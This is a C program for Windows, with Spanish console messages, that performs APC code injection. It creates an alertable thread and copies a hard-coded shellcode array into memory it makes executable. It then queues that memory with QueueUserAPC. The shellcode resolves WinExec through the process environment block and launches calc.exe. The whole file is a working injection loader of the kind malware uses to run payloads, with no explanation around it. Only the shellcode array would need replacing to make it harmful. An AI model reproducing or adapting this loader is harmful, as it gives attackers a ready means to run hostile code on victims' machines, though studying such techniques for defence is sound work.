#include <stdio.h>
#include <windows.h>

BYTE shellcode[] = {
    0x48, 0x83, 0xe4, 0xf0, 0x48, 0x89, 0xe5, 0x48, 0x81, 0xec, 0x00, 0x02, 0x00, 0x00, 0x48, 0xb8, 0x4b, 0x45,
    0x52, 0x4e, 0x45, 0x4c, 0x33, 0x32, 0x48, 0x89, 0x44, 0x24, 0x36, 0x66, 0xc7, 0x44, 0x24, 0x3e, 0x00, 0x00,
    0x48, 0xb8, 0x57, 0x69, 0x6e, 0x45, 0x78, 0x65, 0x63, 0x00, 0x48, 0x89, 0x44, 0x24, 0x2d, 0xc6, 0x44, 0x24,
    0x35, 0x00, 0x48, 0xb8, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x48, 0x89, 0x44, 0x24, 0x23, 0x66,
    0xc7, 0x44, 0x24, 0x2b, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x40,
    0x18, 0x4c, 0x8b, 0x40, 0x20, 0x4d, 0x85, 0xc0, 0x74, 0x2b, 0x0f, 0xb6, 0x54, 0x24, 0x36, 0xeb, 0x08, 0x4d,
    0x8b, 0x00, 0x4d, 0x85, 0xc0, 0x74, 0x1c, 0x66, 0x41, 0x83, 0x78, 0x48, 0x00, 0x74, 0x0e, 0x49, 0x8b, 0x40,
    0x50, 0x38, 0x10, 0x75, 0xe8, 0x4d, 0x8b, 0x40, 0x20, 0xeb, 0x06, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x49,
    0x63, 0x40, 0x3c, 0x41, 0x8b, 0x9c, 0x00, 0x88, 0x00, 0x00, 0x00, 0x4c, 0x01, 0xc3, 0x8b, 0x43, 0x14, 0x85,
    0xc0, 0x0f, 0x84, 0x1b, 0x01, 0x00, 0x00, 0x44, 0x8b, 0x53, 0x20, 0x44, 0x8b, 0x5b, 0x24, 0x4f, 0x8d, 0x0c,
    0x03, 0x89, 0xc0, 0x49, 0x8d, 0x34, 0x41, 0x4d, 0x29, 0xc2, 0xeb, 0x0d, 0x49, 0x83, 0xc1, 0x02, 0x49, 0x39,
    0xf1, 0x0f, 0x84, 0xec, 0x00, 0x00, 0x00, 0x4c, 0x89, 0xc8, 0x4c, 0x29, 0xd8, 0x41, 0x8b, 0x04, 0x42, 0x4c,
    0x01, 0xc0, 0x48, 0x8d, 0x48, 0x07, 0x48, 0x8d, 0x54, 0x24, 0x2d, 0x0f, 0x1f, 0x44, 0x00, 0x00, 0x66, 0x66,
    0x2e, 0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0f, 0xb6, 0x38, 0x40, 0x38, 0x3a, 0x75, 0xc5, 0x48,
    0x83, 0xc2, 0x01, 0x48, 0x83, 0xc0, 0x01, 0x48, 0x39, 0xc8, 0x75, 0xeb, 0x41, 0x0f, 0xb7, 0x11, 0x8b, 0x43,
    0x1c, 0x49, 0x8d, 0x14, 0x90, 0x8b, 0x04, 0x02, 0x49, 0x01, 0xc0, 0x48, 0x8d, 0x4c, 0x24, 0x23, 0xba, 0x00,
    0x00, 0x00, 0x00, 0x41, 0xff, 0xd0, 0x48, 0x81, 0xc4, 0x00, 0x02, 0x00, 0x00
};

VOID dummyFunction() {
    printf("[+] Thread en estado alertable (esperando APCs)...\n");
    SleepEx(INFINITE, TRUE);
    printf("[+] Thread finalizado\n");
}

HANDLE CrearThread() {
    DWORD threadId;
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) dummyFunction, NULL, 0, &threadId);
    if (hThread == NULL) {
        printf("[!] Error creando thread: %lu\n", GetLastError());
        return 0;
    }
    printf("[+] Alertable thread creado con la id: %lu\n", threadId);
    return hThread;
}

VOID apcInyection(HANDLE hThreadAlertState, SIZE_T shellSize, BYTE shellcode[]) {
    PVOID dirMemoria = VirtualAlloc(NULL, shellSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (dirMemoria == NULL) {
        puts("[!] Error al alojar memoria");
        return;
    }
    printf("[+] Memoria alojada en 0x%p\n", dirMemoria);

    RtlCopyMemory(dirMemoria, shellcode, shellSize);

    DWORD oldProtect;
    if (!VirtualProtect(dirMemoria, shellSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        puts("[!] No se pudo cambiar la proteccion de memoria");
        VirtualFree(dirMemoria, 0, MEM_RELEASE);
        return;
    }

    if (!QueueUserAPC((PAPCFUNC) dirMemoria, hThreadAlertState, 0)) {
        printf("[!] Error en QueueUserAPC: %lu\n", GetLastError());
        VirtualFree(dirMemoria, 0, MEM_RELEASE);
        return;
    }
    printf("[+] APC inyeccion realizado en 0x%p\n", dirMemoria);
}

int main(void) {
    HANDLE hThread = CrearThread();
    if (hThread == NULL) {
        puts("[!] Error critico creando el thread");
        return 1;
    }
    Sleep(500);

    apcInyection(hThread, sizeof(shellcode), shellcode);

    printf("[+] Esperando ejecucion del shellcode...\n");
    WaitForSingleObject(hThread, 1000); // El main espera 1 seg hasta que termine el hThread (alert)

    CloseHandle(hThread);
    printf("[+] Programa terminado\n");

    return 0;
}
